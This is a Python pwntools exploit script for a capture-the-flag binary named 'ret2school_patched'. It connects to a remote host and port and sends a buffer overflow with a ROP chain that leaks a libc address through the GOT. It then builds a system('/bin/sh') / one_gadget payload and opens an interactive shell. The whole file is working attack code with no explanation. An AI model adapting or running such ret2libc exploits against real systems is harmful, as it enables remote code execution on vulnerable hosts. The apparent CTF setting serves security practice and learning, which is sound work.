#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("ret2school_patched")
libc = elf.libc

local = False 
if local:
    p = process("./ret2school_patched")
    gdb.attach(p,'''b*main+58\nc''')
else:
    p=remote("20.169.252.240" ,4922)

elf = context.binary = ELF('./ret2school_patched', checksec=False)

path = p64(0x6011b0)*5

main            = 0x400698
print_plt       = 0x400520
print_got_plt   = 0x601018
rdi_ret         = 0x0000000000400743
rsp_3r          = 0x000000000040073d
ret             = 0x000000000040050e
payload = path + p64(rdi_ret) + p64(print_got_plt) + p64(main+25)

p.sendlineafter(b"Send me your homework:", payload)


p.recvuntil(b"@")
leak = (int.from_bytes(p.recv(6),"little") << 4*2) - 413184
binsh = leak + 1785224
system = leak + 0x000000000004f420
og3 = 0x10a2fc+leak
print(hex(leak))
payload = path + p64(rdi_ret) + p64(binsh) + p64(system) 
p.sendline(p64(og3)*6)
#p.sendline(payload)
p.interactive()